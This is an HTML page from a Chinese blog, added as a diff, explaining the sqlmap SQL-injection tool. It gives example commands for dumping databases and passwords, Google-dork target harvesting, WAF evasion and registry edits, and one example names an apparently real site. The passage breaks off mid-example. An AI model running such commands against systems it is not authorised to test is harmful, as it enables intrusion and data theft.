@@ -1,0 +1,340 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>sqlmap | Putdownd--Blog</title><meta name="keywords" content="工具"><meta name="author" content="putdown"><meta name="copyright" content="putdown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQLMAP介绍 sqlmap 是一个由Python语言编写的开源渗透测试工具，它主要用来检测sql注入漏洞，是一款功能强大的sql漏洞检测利用工具。  它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite等  可以进行 sql盲注、union查询、显错注入、延迟注入、post注入、cookie注入等  其他功能:执行命令、列举用户、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap">
+<meta property="og:url" content="http://example.com/archives/e5da2ca1.html">
+<meta property="og:site_name" content="Putdownd--Blog">
+<meta property="og:description" content="SQLMAP介绍 sqlmap 是一个由Python语言编写的开源渗透测试工具，它主要用来检测sql注入漏洞，是一款功能强大的sql漏洞检测利用工具。  它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite等  可以进行 sql盲注、union查询、显错注入、延迟注入、post注入、cookie注入等  其他功能:执行命令、列举用户、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/e5925563a436d850cfc6184421b9ec77.jpeg">
+<meta property="article:published_time" content="2022-07-27T01:51:33.000Z">
+<meta property="article:modified_time" content="2022-08-16T07:47:08.267Z">
+<meta property="article:author" content="putdown">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/e5925563a436d850cfc6184421b9ec77.jpeg"><link rel="shortcut icon" href="/img/5868e2d58ee0499398f987e5a0b30d44.png"><link rel="canonical" href="http://example.com/archives/e5da2ca1"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-t8FWZKLQce"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?f755324450eb55ec18bb83a2d2f2334e";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sqlmap',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-08-16 15:47:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Putdownd--Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/126266.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Putdownd--Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sqlmap</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-27T01:51:33.000Z" title="发表于 2022-07-27 09:51:33">2022-07-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-16T07:47:08.267Z" title="更新于 2022-08-16 15:47:08">2022-08-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sqlmap"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQLMAP介绍"><a href="#SQLMAP介绍" class="headerlink" title="SQLMAP介绍"></a>SQLMAP介绍</h1><ul>
+<li><p>sqlmap 是一个由Python语言编写的开源渗透测试工具，它主要用来检测sql注入漏洞，是一款功能强大的sql漏洞检测利用工具。</p>
+</li>
+<li><p>它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite等</p>
+</li>
+<li><p>可以进行 sql盲注、union查询、显错注入、延迟注入、post注入、cookie注入等</p>
+</li>
+<li><p>其他功能:执行命令、列举用户、检测权限、自动破解、数据导出等功能。</p>
+</li>
+</ul>
+<h1 id="sqlmap安装"><a href="#sqlmap安装" class="headerlink" title="sqlmap安装"></a>sqlmap安装</h1><ul>
+<li>下载地址：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqlmap.org</span><br></pre></td></tr></table></figure></li>
+<li>安装<br>首先需要安装python2.7 环境<br>直接解压即可</li>
+<li>更新<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py --update</span><br></pre></td></tr></table></figure></li>
+<li>建议直接使用 kali 内置sqlmap.<h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><h2 id="基本参数"><a href="#基本参数" class="headerlink" title="基本参数"></a>基本参数</h2></li>
+</ul>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap.py  -h          查看帮助选项</span><br><span class="line">is-dba		           当前用户权限</span><br><span class="line">dbs				       所有数据库</span><br><span class="line">current-db			   网站当前数据库</span><br><span class="line">users			       所有数据库用户</span><br><span class="line">current-user		   当前数据库用户</span><br><span class="line">tables			       参数:列表名</span><br><span class="line">columns			       参数:列字段</span><br><span class="line">dump			       参数:下载数据</span><br><span class="line">--dump 			       获取表中的数据，包含列 </span><br><span class="line">--dump-all			   转存DBMS数据库所有表项目</span><br><span class="line">--level			       测试等级(1-5)，默认为1</span><br></pre></td></tr></table></figure>
+<hr>
+<p>读取数据库—&gt;读取表—-&gt;读取表的列—-&gt;获取内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-D  			指定数据库</span><br><span class="line">-T			    指定表</span><br><span class="line">-C			    指定列</span><br><span class="line">--dbms=mysql  oracle mssql     	指定数据库</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--users	        枚举所有用户</span><br><span class="line">--passwords	    枚举所有用户密码</span><br><span class="line">--roles	        列出数据库管理员角色</span><br><span class="line">--privileges    列出数据库管理员权限</span><br></pre></td></tr></table></figure>
+<p>列举数据库系统的架构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h2><p>参数：–level</p>
+<ul>
+<li>共有五个等级，默认为1，sqlmap使用的payload可以在xml&#x2F;payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</li>
+<li>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent&#x2F;Referer头在level为3的时候就会测试。</li>
+<li>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</li>
+</ul>
+<hr>
+<h2 id="显示调试信息"><a href="#显示调试信息" class="headerlink" title="显示调试信息"></a>显示调试信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-v  显示调试信息 有7个级别</span><br></pre></td></tr></table></figure>
+<p>0、只显示python错误以及严重的信息。<br>1、同时显示基本信息和警告信息。（默认）<br>2、同时显示debug信息。<br>3、同时显示注入的payload。<br>4、同时显示HTTP请求。<br>5、同时显示HTTP响应头。<br>6、同时显示HTTP响应页面。</p>
+<hr>
+<h2 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h2><ul>
+<li>参数：–risk</li>
+<li>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</li>
+<li>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</li>
+<li>测试的语句同样可以在xml&#x2F;payloads.xml中找到，你也可以自行添加payload。</li>
+</ul>
+<hr>
+<h2 id="获取目标"><a href="#获取目标" class="headerlink" title="获取目标"></a>获取目标</h2><p>参数：-u或者–url<br>格式：<code>http(s)://xxxxxxurl[:port]/[…]</code><br>例如：<code>python sqlmap.py -u http://www.xxxxxx.com/vuln.php?id=1</code></p>
+<p>参数：-u或者–url<br>格式：<code>http(s)://xxxxxxurl[:port]/[…]</code><br>例如：<code>python sqlmap.py -u &quot;http://www.xxxxxx.com/vuln.php?id=1&quot;</code></p>
+<hr>
+<h2 id="从文本中获取多个目标扫描"><a href="#从文本中获取多个目标扫描" class="headerlink" title="从文本中获取多个目标扫描"></a>从文本中获取多个目标扫描</h2><p>参数：-m<br>文件中保存url格式如下，sqlmap会一个一个检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.xxxxxx1.com/vuln1.php?q=foobar</span><br><span class="line">www.xxxxxx2.com/vuln2.asp?id=1</span><br><span class="line">www.xxxxxx3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="获取http请求注入"><a href="#获取http请求注入" class="headerlink" title="获取http请求注入"></a>获取http请求注入</h2><p>参数：-r<br>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。</p>
+<p>比如文本文件内如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line">Host: www.xxxxxx.com</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取http请求注入-1"><a href="#获取http请求注入-1" class="headerlink" title="获取http请求注入"></a>获取http请求注入</h2><p>参数：-r<br>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。</p>
+<p>比如文本文件内如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line">Host: www.xxxxxx.com</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>
+<h2 id="处理Google搜索结果"><a href="#处理Google搜索结果" class="headerlink" title="处理Google搜索结果"></a>处理Google搜索结果</h2><p>参数：-g</p>
+<p>sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。</p>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -g &quot;inurl:php?id=&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="–data"><a href="#–data" class="headerlink" title="–data"></a>–data</h2><p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u “http://www.xxxx.com/xxxx.php” --data=“id=1”</span><br></pre></td></tr></table></figure>
+
+<h2 id="–param-del"><a href="#–param-del" class="headerlink" title="–param-del"></a>–param-del</h2><p>参数拆分字符</p>
+<p>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://www.xxxx.com/vuln.php&quot; --data=&quot;query=foobar;d=1&quot; --param-del=&quot;;&quot; </span><br></pre></td></tr></table></figure>
+
+<h2 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h2><p>适用于cookie注入</p>
+<p>将参加加入cookie注入测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ntjx.org/jsj/DownloadShow.asp&quot; --cookie &quot;id=9&quot; --table --level 2</span><br></pre></td></tr></table></figure>
+
+<h2 id="–referer-–headers-–proxy"><a href="#–referer-–headers-–proxy" class="headerlink" title="–referer,–headers,–proxy"></a>–referer,–headers,–proxy</h2><p>–referer<br>sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入。  </p>
+<p>–headers<br>可以通过–headers参数来增加额外的http头<br>–hearders “client-ip: 1.1.1.1’”  </p>
+<p>–proxy<br>使用–proxy代理是格式为：<code>http://url:port。</code><br>–proxy&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1:1080/">http://127.0.0.1:1080</a><br>–proxy-file c:&#x2F;1.txt</p>
+<h2 id="时间控制"><a href="#时间控制" class="headerlink" title="时间控制"></a>时间控制</h2><p>–delay<br>可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
+<p>–timeout<br>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。<br>设定重试超时<br>–retries</p>
+<p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。<br>设定随机改变的参数值</p>
+<h2 id="–safe-url-–safe-freq"><a href="#–safe-url-–safe-freq" class="headerlink" title="–safe-url,–safe-freq"></a>–safe-url,–safe-freq</h2><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p>
+<p>绕过这个策略有两种方式：</p>
+<p>1、–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。<br>2、–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</p>
+<h2 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h2><p>sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p</p>
+<p>参数设置想要测试的参数。例如： -p “id,user-anget”</p>
+<h2 id="–prefix-–suffix"><a href="#–prefix-–suffix" class="headerlink" title="–prefix,–suffix"></a>–prefix,–suffix</h2><p>有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</p>
+<p>例如，代码中是这样调用数据库的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;; </span><br></pre></td></tr></table></figure>
+<p>这时你就需要–prefix和–suffix参数了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</span><br></pre></td></tr></table></figure>
+<p>这样执行的SQL语句变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;; </span><br></pre></td></tr></table></figure>
+
+<h2 id="–technique"><a href="#–technique" class="headerlink" title="–technique"></a>–technique</h2><p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p>
+<p>支持的探测方式如下：</p>
+<p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p>
+<h2 id="–union-cols"><a href="#–union-cols" class="headerlink" title="–union-cols"></a>–union-cols</h2><p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。设定–union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
+<p>–union-char<br>默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用–union-char只定UNION查询的字符。<br>二阶SQL注入</p>
+<h2 id="–second-order"><a href="#–second-order" class="headerlink" title="–second-order"></a>–second-order</h2><p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后门跟一个判断页面的URL地址.</p>
+<h2 id="–dump-all-–exclude-sysdbs"><a href="#–dump-all-–exclude-sysdbs" class="headerlink" title="–dump-all,–exclude-sysdbs"></a>–dump-all,–exclude-sysdbs</h2><p>使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为</p>
+<p>有的管理员会把他当初用户数据库一样来使用它。</p>
+<h2 id="–dump-all-–exclude-sysdbs-1"><a href="#–dump-all-–exclude-sysdbs-1" class="headerlink" title="–dump-all,–exclude-sysdbs"></a>–dump-all,–exclude-sysdbs</h2><p>使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为</p>
+<p>有的管理员会把他当初用户数据库一样来使用它。</p>
+<h2 id="–search-C-T-D"><a href="#–search-C-T-D" class="headerlink" title="–search,-C,-T,-D"></a>–search,-C,-T,-D</h2><p>–search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p>
+<p>可以在一下三种情况下使用：</p>
+<p>-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。<br>-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名<br>-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</p>
+<h2 id="–udf-inject-–shared-lib"><a href="#–udf-inject-–shared-lib" class="headerlink" title="–udf-inject,–shared-lib"></a>–udf-inject,–shared-lib</h2><p>你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux&#x2F;Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后</p>
+<p>根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p>
+<h2 id="s-t"><a href="#s-t" class="headerlink" title="-s,-t"></a>-s,-t</h2><p>参数：-s</p>
+<p>sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。<br>保存HTTP(S)日志</p>
+<p>参数：-t</p>
+<p>这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。</p>
+<h2 id="–batch"><a href="#–batch" class="headerlink" title="–batch"></a>–batch</h2><p>–batch</p>
+<p>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
+<p>强制使用字符编码<br>–charset</p>
+<p>不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：</p>
+<p>–charset&#x3D;GBK</p>
+<h2 id="–flush-session"><a href="#–flush-session" class="headerlink" title="–flush-session"></a>–flush-session</h2><p>–flush-session</p>
+<p>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。<br>自动获取form表单测试<br>–hex<br>有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：<br>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot; --banner --hex -v 3 --parse-errors</span><br></pre></td></tr></table></figure>
+<h2 id="–output-dir"><a href="#–output-dir" class="headerlink" title="–output-dir"></a>–output-dir</h2><p>–output-dir</p>
+<p>sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：–output-dir&#x3D;&#x2F;tmp<br>从响应中获取DBMS的错误信息</p>
+<p>参数：–parse-errors</p>
+<p>有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。</p>
+<h2 id="–smart-–mobile"><a href="#–smart-–mobile" class="headerlink" title="–smart,–mobile"></a>–smart,–mobile</h2><p>–smart<br>有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。<br>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot; --batch --smart</span><br></pre></td></tr></table></figure>
+<p>–mobile<br>有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。<br>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://www.xxxxxx.com/vuln.php?id=1&quot; --mobile</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="–identify-waf-–check-waf"><a href="#–identify-waf-–check-waf" class="headerlink" title="–identify-waf,–check-waf"></a>–identify-waf,–check-waf</h2><p>–identify-waf<br>sqlmap可以尝试找出WAF&#x2F;IPS&#x2F;IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。</p>
+<p>–check-waf<br>WAF&#x2F;IPS&#x2F;IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试<br>例如对一个受到ModSecurity WAF保护的MySQL例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; --identify-waf -v 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h2><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。 当然，当前连接数据库的用户也需要有权限操作注册表。<br>读取注册表值<br>参数：–reg-read<br>写入注册表值<br>参数：–reg-add<br>删除注册表值<br>参数：–reg-del<br>注册表辅助选项<br>参数：–reg-key，–reg-value，–reg-data，–reg-type<br>需要配合之前三个参数使用，例子：</p>
